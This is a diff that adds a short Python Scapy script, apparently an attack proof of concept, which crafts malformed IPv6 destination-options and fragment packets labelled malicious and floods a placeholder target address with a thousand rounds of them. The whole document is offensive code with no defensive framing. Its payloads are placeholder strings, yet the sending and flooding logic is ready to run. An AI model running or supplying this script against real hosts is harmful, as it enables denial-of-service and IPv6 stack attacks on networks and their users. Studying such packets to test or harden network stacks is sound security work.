@@ -1,0 +1,19 @@
+from scapy.all import *
+
+# Target IP address
+target_ip = "TARGET_IP"
+
+# Craft the first malicious packet
+first_packet = Ether()/IPv6(dst=target_ip)/IPv6ExtHdrDestOpt(options=[PadN(optdata='a'*3)])
+
+# Fragment the malicious packet into two parts
+fragment_packet_1 = Ether()/IPv6(dst=target_ip)/IPv6ExtHdrFragment(id=1234, m=1, offset=0)/"malicious_payload_part1"
+fragment_packet_2 = Ether()/IPv6(dst=target_ip)/IPv6ExtHdrFragment(id=1234, m=0, offset=1)/"malicious_payload_part2"
+
+# Send the first malicious packet
+send(first_packet)
+
+# Flood the target with fragmented packets
+for _ in range(1000):
+    send(fragment_packet_1)
+    send(fragment_packet_2)
